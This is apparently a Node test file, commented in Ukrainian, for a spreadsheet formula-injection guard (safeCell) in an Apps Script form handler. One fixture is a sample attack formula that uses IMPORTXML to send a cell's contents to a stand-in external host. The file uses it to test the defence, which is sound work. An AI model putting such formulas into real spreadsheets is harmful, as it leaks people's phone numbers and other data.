/**
 * Код таблиці — worker/sheet.gs
 *
 * Файл живе не в збірці, а в редакторі Apps Script, тож імпортувати його не
 * можна. Тому функцію дістаємо просто з тексту файлу: так перевіряється саме
 * той код, який поїде в таблицю, а не його переказ у тесті.
 *
 * Перевіряється захист від формул. Таблиця виконує рядок, що починається з `=`,
 * щойно власник відкриє файл, — і заповнена форма стає способом виконати код у
 * чужій таблиці та вивезти з неї чужі телефони.
 */
import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'

const джерело = readFileSync(new URL('../worker/sheet.gs', import.meta.url), 'utf8')
const тіло = джерело.slice(джерело.indexOf('function safeCell'), джерело.indexOf('function doPost'))
const safeCell = new Function(тіло + '; return safeCell')()

describe('safeCell', () => {
  test('знешкоджує формулу — таблиця побачить текст, а не код', () => {
    const атака = '=IMPORTXML("https://чуже.test/?d="&A2;"//a")'
    assert.equal(safeCell(атака), "'" + атака)
  })

  test('накриває всі чотири початки, які таблиця вважає формулою', () => {
    for (const знак of ['=', '+', '-', '@']) {
      assert.equal(safeCell(знак + 'HYPERLINK("x")').startsWith("'"), true, `${знак} лишився небезпечним`)
    }
  })

  test('звичайний текст не чіпає', () => {
    assert.equal(safeCell('Працював три роки'), 'Працював три роки')
  })

  test("імʼя з апострофом лишається собою", () => {
    assert.equal(safeCell("О'Коннор"), "О'Коннор")
  })

  test('порожнє значення стає порожнім рядком, а не «undefined»', () => {
    assert.equal(safeCell(undefined), '')
    assert.equal(safeCell(null), '')
  })

  test('телефон із плюсом лишається телефоном', () => {
    // Апостроф тут доречний: таблиця показує його як текст і не ховає цифри.
    assert.equal(safeCell('+38 (097) 695-24-73'), "'+38 (097) 695-24-73")
  })
})

describe('цілісність файлу', () => {
  test('усі колонки відгуку проходять через safeCell', () => {
    const рядок = джерело.slice(джерело.indexOf('vacancySheet(book).appendRow'), джерело.indexOf('sendVacancyEmail'))
    for (const поле of ['name', 'phone', 'position', 'comment', 'source']) {
      assert.match(рядок, new RegExp(`safeCell\\(data\\.${поле}\\)`), `${поле} пишеться сирим`)
    }
  })

  test('заявки клієнтів захищені так само', () => {
    assert.match(джерело, /safeCell\(data\.name\)[\s\S]{0,200}safeCell\(data\.phone\)/)
  })

  test('мітка версії оновлена разом із кодом', () => {
    assert.match(джерело, /var VERSION = 'sheet\.gs \d{4}-\d{2}-\d{2}/)
  })
})
